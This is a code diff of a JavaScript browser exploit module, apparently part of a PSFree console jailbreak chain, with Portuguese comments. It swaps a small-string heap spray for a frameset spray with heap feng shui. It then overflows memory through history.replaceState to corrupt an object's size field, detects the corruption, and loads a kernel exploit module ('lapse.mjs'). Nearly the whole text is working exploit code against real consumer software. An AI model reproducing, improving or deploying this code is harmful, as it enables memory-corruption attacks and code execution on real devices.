@@ -1,144 +1,132 @@
-/* PSFree Modular: Cluster Bomb Strategy
-   Trigger: 1MB Overflow
-   Victim: Swarm of Small Strings (96 bytes) - PSFree Standard
+/* PSFree Modular: Frameset OOM Detector
+   Target: 1MB Contiguous Object (_size + _data)
+   Success Condition: Memory Error when reading property
 */
 
 import { log, sleep } from './module/utils.mjs';
 
 // --- CONFIGURAÇÃO ---
-const OVERFLOW_AMT = 1024 * 128; // Exagero proposital para atropelar tudo
-const BASE_OFFSET = 709520;
+const BASE_OFFSET = 709520; 
+const OVERFLOW_AMT = 1024 * 64; 
 
-// Configuração da Vítima (Pequena - Estilo PSFree)
-const VICTIM_SIZE = 96; // Tamanho pequeno padrão do PSFree
-const SWARM_SIZE = 10000; // Quantidade massiva
+// Configuração da Vítima (1MB)
+// Total 1MB - 8 bytes header = Dados
+const TARGET_BYTES = 1024 * 1024;
+const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
+const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);
 
 var victims = [];
-var blockers = [];
 
 async function main() {
-    log("=== PSFree: Cluster Bomb Strategy ===");
-    log("Tática: Criar um buraco de 1MB cercado por milhares de vítimas pequenas.");
+    log("=== PSFree: Frameset OOM Detector ===");
+    log("Estratégia: Corromper '_size' e detectar Erro de Memória.");
 
-    // Tenta 5 vezes, recriando o Heap a cada vez
-    for (let attempt = 1; attempt <= 5; attempt++) {
-        log(`\n--- Tentativa ${attempt} ---`);
+    // 1. WARMUP (Do arquivo psfree.mjs original)
+    // Prepara o alocador para receber objetos grandes no lugar certo
+    log("[1] Aquecendo alocador...");
+    let dummy = "W".repeat(BASE_OFFSET);
+    history.replaceState(dummy, "warmup", null);
+    await sleep(100);
+
+    // Tenta pontes de 0 a 24 bytes (ajuste fino de alinhamento)
+    for (let bridge = 0; bridge <= 24; bridge += 8) {
+        log(`\n[TESTE] Ponte de Zeros: ${bridge} bytes`);
         
-        await prepare_cluster();
+        await prepare_heap();
         
-        // Dispara o exploit
-        let success = await trigger_cluster();
+        // Dispara
+        let success = await trigger_exploit(bridge);
         
         if (success) {
             log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
-            // Carrega o Lapse
+            log("O sistema tentou alocar memória infinita. Temos controle.", 'green');
+            
+            log("Carregando Kernel Exploit (Lapse)...", 'green');
+            // Carrega a cadeia que usa o seu arquivo 1200.mjs
             await import('./lapse.mjs');
             return;
         }
         
-        // Limpa tudo
+        // Limpa para a próxima tentativa
         victims = [];
-        blockers = [];
         await forceGC();
     }
     
-    log("Falha. O isolamento do Heap 12.00 é muito forte.", 'red');
+    log("Falha. Reinicie o console para limpar o Heap.", 'red');
 }
 
-// Cria a String no formato PSFree (Header + Dados)
-function create_victim_string(index) {
-    const u32 = new Uint32Array(1);
-    u32[0] = index;
-    const u8 = new Uint8Array(u32.buffer);
-    
-    // Padding para chegar no tamanho desejado
-    // 96 bytes total - overhead
-    const pad = "B".repeat(VICTIM_SIZE - 4); 
-    
-    // Retorna string flat
-    return [pad, String.fromCodePoint(...u8)].join('');
-}
-
-async function prepare_cluster() {
-    log("1. Posicionando Bloqueadores (1MB)...");
-    blockers = [];
-    // Criamos alguns blocos grandes para reservar o espaço do exploit
-    for(let i=0; i<10; i++) {
-        let b = new Uint8Array(1024 * 1024); // 1MB
-        b.fill(0x41);
-        blockers.push(b);
-    }
-
-    log(`2. Lançando Enxame (${SWARM_SIZE} vítimas)...`);
+async function prepare_heap() {
     victims = [];
-    // Spray massivo de objetos pequenos
-    for(let i=0; i<SWARM_SIZE; i++) {
-        victims.push(create_victim_string(i));
+    const SPRAY_COUNT = 80;
+
+    // SPRAY FRAMESET
+    for(let i=0; i<SPRAY_COUNT; i++) {
+        let fset = document.createElement('frameset');
+        fset.rows = ROWS_STRING;
+        victims.push(fset);
     }
 
-    await forceGC();
-    
-    log("3. Abrindo o Buraco (Target Zone)...");
-    // Liberamos os blocos de 1MB. Agora temos buracos gigantes cercados por vítimas pequenas.
-    blockers = []; 
+    // BURACOS (Feng Shui)
+    for(let i=0; i<SPRAY_COUNT; i+=2) {
+        victims[i].rows = ""; 
+        victims[i] = null;
+    }
     await forceGC();
 }
 
-async function trigger_cluster() {
+async function trigger_exploit(bridgeSize) {
     try {
-        log("4. Disparando Overflow no Buraco...");
-
-        // O Payload é o mesmo: Enche o buraco e transborda
         let buffer = "A".repeat(BASE_OFFSET);
         
-        // Não usamos ponte de zeros aqui. Queremos destruir tudo.
-        // O alvo são objetos pequenos, o header está a poucos bytes da borda.
+        // A Ponte: Zeros para alinhar ou pular padding sem causar crash
+        if (bridgeSize > 0) {
+            buffer += "\u0000".repeat(bridgeSize);
+        }
+        
+        // O Ataque: 0x01 no _size
+        // Isso transforma o tamanho em um número gigante
         buffer += "\x01".repeat(OVERFLOW_AMT);
         
-        history.replaceState({}, "cluster", "/" + buffer);
+        history.replaceState({}, "pwn", "/" + buffer);
 
-        return check_swarm();
+        return check_victims();
 
     } catch(e) {
-        log("Erro no Trigger: " + e.message);
+        log("Erro no Trigger (Ignorado): " + e.message);
         return false;
     }
 }
 
-function check_swarm() {
-    log("5. Verificando sobreviventes...");
-    for(let i=0; i<victims.length; i++) {
-        let s = victims[i];
-        if(!s) continue;
+function check_victims() {
+    for(let i=1; i<victims.length; i+=2) {
+        let fset = victims[i];
+        if(!fset) continue;
 
         try {
-            // O truque do Error
-            let err = new Error(s);
-            let msg = err.message;
-
-            // Se o tamanho mudou (RCE)
-            // Como as strings são pequenas (96 bytes), qualquer mudança drástica é visível
-            if (msg.length !== VICTIM_SIZE && msg.length > 0) {
-                log(`!!! JACKPOT !!! Vítima ${i} (Pequena) Length: ${msg.length}`, 'green');
-                alert("RCE UNLOCKED (CLUSTER)!");
+            // Tenta ler a propriedade.
+            // Se _size for normal, lê rápido.
+            // Se _size for 0x0101... (Gigante), vai tentar alocar string de Petabytes.
+            let s = fset.rows;
+            
+            // Se leu e o tamanho está visivelmente errado
+            if (s.length !== ROWS_STRING.length) {
+                log(`[JACKPOT] Tamanho alterado detectado: ${s.length}`, 'green');
                 return true;
             }
 
-            // Se o conteúdo mudou
-            if (msg.charCodeAt(0) !== 66) { // 'B'
-                // Em objetos pequenos, acertar dados geralmente significa ter passado pelo header
-                // ou destruído o objeto.
-                log(`[Sinal] Vítima ${i} corrompida.`, 'yellow');
-            }
-
-        } catch(e) {}
+        } catch(e) {
+            // AQUI É A VITÓRIA REAL
+            // O Catch pega o erro "Out of Memory" ou "Invalid String Length"
+            log(`[JACKPOT] Erro ao ler Frameset ${i}: ${e.message}`, 'green');
+            return true;
+        }
     }
     return false;
 }
 
 async function forceGC() {
     try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-    return new Promise(r => setTimeout(r, 400));
+    return new Promise(r => setTimeout(r, 500));
 }
 
 main();
